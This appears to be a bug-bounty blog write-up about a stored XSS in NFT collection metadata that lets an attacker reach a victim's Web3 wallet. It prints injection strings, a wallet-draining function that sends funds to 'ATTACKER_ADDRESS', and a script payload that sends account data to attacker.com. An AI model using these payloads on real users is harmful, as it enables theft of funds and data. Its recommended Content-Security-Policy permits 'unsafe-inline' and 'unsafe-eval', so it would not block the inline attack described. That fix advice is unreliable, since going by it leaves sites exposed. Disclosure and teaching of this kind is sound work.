---
layout: post
title: "How I Found a Stored XSS That Led to Account Takeover on a Web3 Platform"
date: 2024-03-02 16:00:00 +0000
categories: [Bug Hunting, Web Security, Web3]
tags: [xss, web3, ethereum, metamask, bug-bounty]
---

## The Discovery

Hey crypto security enthusiasts! Today, I'm sharing an exciting discovery where I found a stored XSS vulnerability on a Web3 platform that led to account takeover. This case study shows how traditional web vulnerabilities can have severe implications in the Web3 space.

## Initial Investigation

### The Vulnerable Feature

The platform allowed users to create NFT collections with customizable metadata:

```json
{
    "name": "My NFT Collection",
    "description": "A unique collection of digital art",
    "external_url": "https://example.com",
    "image": "https://example.com/image.png"
}
```

## The Vulnerability

### XSS in Metadata

The application didn't properly sanitize the metadata fields before displaying them in the UI. This allowed for stored XSS:

```json
{
    "name": "<img src=x onerror='alert(1)'>",
    "description": "Malicious payload here",
    "external_url": "javascript:alert(document.domain)"
}
```

### The Web3 Connection

The real impact came from the platform's integration with Web3 wallets. The XSS payload could interact with the user's Web3 wallet:

```javascript
// Malicious payload
async function exploitWeb3() {
    const provider = window.ethereum;
    const accounts = await provider.request({ 
        method: 'eth_requestAccounts' 
    });
    
    // Send transactions
    await provider.request({
        method: 'eth_sendTransaction',
        params: [{
            from: accounts[0],
            to: 'ATTACKER_ADDRESS',
            value: '0x1234567890'
        }]
    });
}
```

## Proof of Concept

### The Attack Chain

1. Create NFT collection with XSS payload
2. Victim views collection
3. Payload executes
4. Payload interacts with Web3 wallet
5. Unauthorized transactions possible

### The Payload

```javascript
<script>
(async () => {
    try {
        // Request wallet access
        const accounts = await ethereum.request({
            method: 'eth_requestAccounts'
        });
        
        // Send data to attacker's server
        await fetch('https://attacker.com/collect', {
            method: 'POST',
            body: JSON.stringify({
                account: accounts[0],
                network: ethereum.networkVersion
            })
        });
        
        // Setup transaction listener
        ethereum.on('accountsChanged', (accounts) => {
            // Monitor account changes
        });
        
    } catch (e) {
        console.error(e);
    }
})();
</script>
```

## Impact

This vulnerability allowed an attacker to:
1. Execute arbitrary JavaScript
2. Access victim's Web3 wallet
3. Request wallet connections
4. Initiate unauthorized transactions
5. Monitor wallet activities

## Root Cause Analysis

The vulnerability stemmed from:
1. Insufficient input sanitization
2. Lack of Content Security Policy
3. Unrestricted metadata rendering
4. Missing Web3 security controls

## The Fix

### Input Sanitization

```javascript
function sanitizeMetadata(metadata) {
    return {
        name: DOMPurify.sanitize(metadata.name),
        description: DOMPurify.sanitize(metadata.description),
        external_url: sanitizeURL(metadata.external_url),
        image: sanitizeURL(metadata.image)
    };
}
```

### Content Security Policy

```http
Content-Security-Policy: 
    default-src 'self';
    script-src 'self' 'unsafe-inline' 'unsafe-eval';
    connect-src 'self' https://*.infura.io;
    frame-src 'self' https://*.wallet.com;
```

### Web3 Security Controls

```javascript
// Implement transaction confirmation
async function confirmTransaction(tx) {
    const confirmation = await showConfirmationDialog({
        type: tx.type,
        amount: tx.value,
        to: tx.to
    });
    
    if (!confirmation) {
        throw new Error('Transaction rejected by user');
    }
}
```

## Lessons Learned

1. Traditional vulnerabilities are still relevant in Web3
2. Always sanitize user input
3. Implement proper CSP
4. Consider Web3-specific security implications
5. Test all user-controlled data points

## Tools Used

- Burp Suite Professional
- Custom Web3 testing scripts
- MetaMask
- Hardhat for local blockchain testing

## Timeline

- Discovery: [Redacted]
- PoC Development: [Redacted]
- Report Submitted: [Redacted]
- Fix Deployed: [Redacted]
- Bounty Awarded: [Redacted]

## Defense Recommendations

1. Implement strict input validation
2. Use Content Security Policy
3. Sanitize metadata rendering
4. Add transaction confirmations
5. Regular security audits

## Key Takeaways

1. Web3 doesn't make traditional vulnerabilities obsolete
2. XSS in Web3 context can be catastrophic
3. Always consider platform-specific implications
4. Implement defense in depth

## Conclusion

This finding demonstrates:
- The intersection of traditional and Web3 security
- How classic vulnerabilities can have new impacts
- The importance of comprehensive security testing
- Why input sanitization is still crucial

Remember: In Web3, traditional vulnerabilities can have blockchain-level implications. Stay vigilant!

Happy hunting! 🎯

---
*Note: All details have been sanitized and shared with permission. Always practice responsible disclosure.*